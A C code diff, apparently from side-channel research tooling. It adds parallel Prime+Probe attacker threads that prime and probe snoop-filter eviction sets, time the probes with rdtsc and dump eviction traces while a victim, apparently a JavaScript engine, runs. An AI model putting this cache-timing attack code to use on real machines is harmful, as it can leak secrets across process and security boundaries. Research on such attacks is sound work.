@@ -10,8 +10,7 @@ void PS_profile_once(EVSet *evset,
                      uint64_t profile_samples,
                      uint64_t max_exec_cycles,
                      uint64_t **sample_tsc,
-                     uint64_t **probe_time)
-{
+                     uint64_t **probe_time) {
 	uint64_t tsc0, tsc1;
 	uint8_t *scope = evset->addrs[0];
 	evchain *sf_chain = evchain_build(evset->addrs, SF_ASSOC);
@@ -57,7 +56,7 @@ void PS_profile_once(EVSet *evset,
 		pthread_barrier_wait(sync_ctx.barrier);
 	}
 
-	log_trace("Profiling rdtsc:\n"
+	log_debug("Profiling rdtsc:\n"
 	          "pid:\t%d\n"
 	          "start:\t%ld\n"
 	          "end:\t%ld\n"
@@ -72,8 +71,7 @@ void PS_profile_once(EVSet *evset,
 	return;
 }
 
-void *PS_attacker_thread(void *args)
-{
+void *PS_attacker_thread(void *args) {
 	PS_attacker_thread_config_t *pt_config =
 	    (PS_attacker_thread_config_t *)args;
 	uint64_t tsc0, tsc1;
@@ -131,13 +129,130 @@ void *PS_attacker_thread(void *args)
 	return NULL;
 }
 
+void PP_profile_once(EVSet *evset,
+                     int slot,
+                     const char *label,
+                     int threshold,
+                     int profile_samples,
+                     uint64_t max_exec_cycles,
+                     uint64_t **sample_tsc,
+                     uint64_t **probe_time) {
+	u64 n_recvs = 0, iters = 0, end, n_switches = 0;
+	u32 aux, last_aux, index = 0;
+
+	_rdtscp_aux(&last_aux);
+	flush_evset(evset);
+	_lfence();
+	prime_skx_sf_evset_para(evset, array_repeat, l2_repeat);
+
+	u64 last_tsc, tsc0;
+	last_tsc = tsc0 = _rdtsc();
+	while (_rdtsc() - tsc0 < max_exec_cycles && index < profile_samples) {
+		u64 now_tsc = _rdtsc();
+
+		u64 lat = 0;
+		lat = probe_skx_sf_evset_para(evset, &end, &aux);
+		bool spurious = (aux != last_aux) ||
+		                lat > detected_cache_lats.interrupt_thresh;
+
+		if (spurious || lat > threshold) {
+			prime_skx_sf_evset_para(evset, array_repeat, l2_repeat);
+			if (!spurious) {
+				probe_time[slot][index] = lat;
+				sample_tsc[slot][index] = now_tsc;
+				_mfence();
+				_lfence();
+				u32 blindspot = _rdtscp_aux(&aux) - end;
+				++index;
+			}
+			last_aux = aux;
+		}
+		last_tsc = now_tsc;
+	}
+
+	log_info(
+	    "Prime+Probe %d (%s) detects %d times of eviction during %lu cycles, "
+	    "one noise per %lf cycles on average",
+	    slot,
+	    label,
+	    index,
+	    last_tsc - tsc0,
+	    (double)(last_tsc - tsc0) / (index == 0 ? 1 : index));
+
+	return;
+}
+
+void *PP_attacker_thread(void *args) {
+	PP_attacker_thread_config_t *pt_config =
+	    (PP_attacker_thread_config_t *)args;
+	uint64_t tsc0, tsc1;
+
+	EVSet *evset = pt_config->evset;
+	const int slot = pt_config->slot;
+	const char *test_name = pt_config->test_name;
+	const char *label = pt_config->label;
+	const int cache_line_count = pt_config->cache_line_count;
+	const int profile_samples = pt_config->profile_samples;
+	const int victim_runs = pt_config->victim_runs;
+	const int threshold = pt_config->threshold;
+	const uint64_t max_exec_cycles = pt_config->max_exec_cycles;
+	pthread_barrier_t *thread_barrier = pt_config->threads_barrier;
+	uint64_t **sample_tsc = pt_config->sample_tsc;
+	uint64_t **probe_time = pt_config->probe_time;
+
+	log_info("Parallel Prime+Probe threhold: %ld", pt_config->threshold);
+
+	if (slot == 0) {
+		log_info("Prime+Probe wait for the warmup run");
+		/* pthread_barrier_wait(&quickjs_barrier); */
+	}
+
+	tsc0 = rdtscp();
+	for (int i = 0; i < victim_runs; ++i) {
+		pthread_barrier_wait(thread_barrier);
+		if (slot == 0) {
+			/* pthread_barrier_wait(&quickjs_barrier); */
+		}
+
+		int index = 0;
+
+		PP_profile_once(evset,
+		                slot,
+		                label,
+		                threshold,
+		                profile_samples,
+		                max_exec_cycles,
+		                sample_tsc,
+		                probe_time);
+
+		if (slot == 0) {
+			uint64_t *sample_tsc_ap[cache_line_count];
+			uint64_t *probe_time_ap[cache_line_count];
+			for (int i = 0; i < cache_line_count; ++i) {
+				sample_tsc_ap[i] = sample_tsc[i];
+				probe_time_ap[i] = probe_time[i];
+			}
+			dump_profiling_traces(test_name,
+			                      victim_runs,
+			                      sample_tsc_ap,
+			                      probe_time_ap,
+			                      cache_line_count,
+			                      profile_samples,
+			                      i == 0);
+		}
+	}
+	tsc1 = rdtscp();
+	log_info(
+	    "Profiler rdtsc %d: %ld %ld %ld", getpid(), tsc0, tsc1, tsc1 - tsc0);
+	return NULL;
+}
+
 void dump_profiling_trace(const char *dump_prefix,
                           int dump_id,
                           uint64_t **sample_tsc,
                           uint64_t **reload_time,
                           int cl_cnt,
-                          int sp_cnt)
-{
+                          int sp_cnt) {
 	static int trace_idx = 0;
 	char output_dir[256], output_file[256];
 
@@ -169,8 +284,7 @@ void dump_profiling_traces(const char *dump_prefix,
                            uint64_t **reload_time,
                            int cl_cnt,
                            int sp_cnt,
-                           int reset)
-{
+                           int reset) {
 	static int trace_idx = 0;
 	char output_dir[256], output_file[256];
 
